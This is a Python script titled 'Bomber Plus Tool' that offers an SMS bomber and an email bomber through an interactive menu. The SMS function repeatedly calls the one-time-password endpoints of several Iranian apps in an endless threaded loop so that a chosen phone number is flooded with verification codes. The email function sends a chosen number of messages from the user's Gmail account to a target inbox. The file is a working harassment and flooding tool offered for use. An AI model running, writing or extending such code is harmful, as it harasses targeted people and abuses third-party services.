from platform import node, system, release; Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import smtplib
from email.mime.text import MIMEText
import random
import sys
import socket

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'  
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'     
d = '\033[90;1m'  

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Progress bar
def progress_bar(progress, total, width=30):
    percent = int((progress / total) * 100)
    filled = int(width * progress // total)
    bar = f"{g}█{a}" * filled + f"{r}-{a}" * (width - filled)
    sys.stdout.write(f"\r{p}[Progress] {y}{percent}% {w}[{bar}]")
    sys.stdout.flush()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# Random email messages
random_messages = [
    "Hello! This is a test message. Hope you're having a great day!",
    "Hey there! Just dropping by to say hi from our tool.",
    "This is an automated message to test our system. Please ignore it!",
    "Hi friend, this is a random message to check your email.",
    "Good news! Our tool is working, and this message is proof.",
]

# Send email
def send_email(target_email, sender_email, sender_password, smtp_server="smtp.gmail.com", smtp_port=587, retries=3):
    for attempt in range(retries):
        try:
            body = random.choice(random_messages)
            msg = MIMEText(body)
            msg['Subject'] = f"Test Message #{random.randint(1, 1000)}"
            msg['From'] = f"Test Tool <{sender_email}>"
            msg['To'] = target_email
            msg['Reply-To'] = sender_email
            
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            server.set_debuglevel(0)  
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, target_email, msg.as_string())
            server.quit()
            return True
        except Exception as e:
            if attempt < retries - 1:
                sleep(2)
            else:
                print(f"{r}[Email Error] {a}Failed after {retries} attempts: {e}")
                return False

# Email bomber
def email_bomber(target_email, sender_email, sender_password, count, delay):
    if not check_internet():
        print_slow(f"{r}[-] {y}No internet connection!")
        sleep(2)
        return
    
    print_slow(f"{p}╔═════[ Email Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{target_email}")
    print_slow(f"{g}Payloads: {y}{count} emails")
    print_slow(f"{g}Delay: {y}{delay}s")
    print_slow(f"{p}╚═════════════════════════════════════╝")
    sleep(1)

    for i in range(count):
        try:
            Thread(target=send_email, args=(target_email, sender_email, sender_password)).start()
            progress_bar(i + 1, count)
            sys.stdout.write(f" {b}[+] {y}Email {i+1}/{count} Sent!\n")
            sys.stdout.flush()
            sleep(delay)
        except KeyboardInterrupt:
            print_slow(f"{r}[-] {y}Stopped by user!")
            break
    
    print_slow(f"{g}[+] {y}Mission Completed!")
    sleep(1)  
    system('clear' if name == 'posix' else 'cls')  

# ------------------------------
# SMS services (only defined ones)
# ------------------------------
def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
    snapD = {"cellphone": phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {a}Code Sent')
            return True
    except:
        pass

def gap(phone):
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
        if "OK" in gapR:
            print(f'{g}(Gap) {a}Code Sent')
            return True     
    except:
        pass

def divar(phone):
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", json=divarD).json()
        if divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {a}Code Sent')
            return True
    except:
        pass

def alibaba(phone):
    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
        if alibabaR.get("result", {}).get("success"):
            print(f'{g}(AliBaba) {a}Code Sent')
            return True
    except:
        pass

def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        meR = post(url=meU, data=meD).json()
        if meR.get('isSuccess'):
            print(f'{g}(HamrahMechanic) {a}Code Sent')
            return True
    except: 
        pass

# Simple SMS bomber
def Vip(phone, Time):
    services = [snap, gap, divar, alibaba, mek]  # فقط همین‌ها
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    try:
        while True:
            for service in services:
                try:
                    Thread(target=service, args=[phone]).start()
                    sleep(Time)
                except Exception as e:
                    print(f"{r}[-] {a}Error in {service.__name__}: {e}")
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        system('clear' if name == 'posix' else 'cls')  

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# Menu
def main_menu():
    system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    choice = input(f"{g}[?] {y}Enter Choice (0-2): {a}")
    return choice

def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Initializing Email Bomber!")
            target_email = input(f"{g}[?] {y}Target Email: {a}")
            sender_email = input(f"{g}[?] {y}Your Email: {a}")
            sender_password = input(f"{g}[?] {y}Your Email App Password: {a}")
            try:
                count = int(input(f"{g}[?] {y}Number of Emails [Default=10]: {a}") or 10)
                delay = float(input(f"{g}[?] {y}Delay (seconds) [Default=1.0]: {a}") or 1.0)
            except ValueError:
                count, delay = 10, 1.0
            email_bomber(target_email, sender_email, sender_password, count, delay)

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
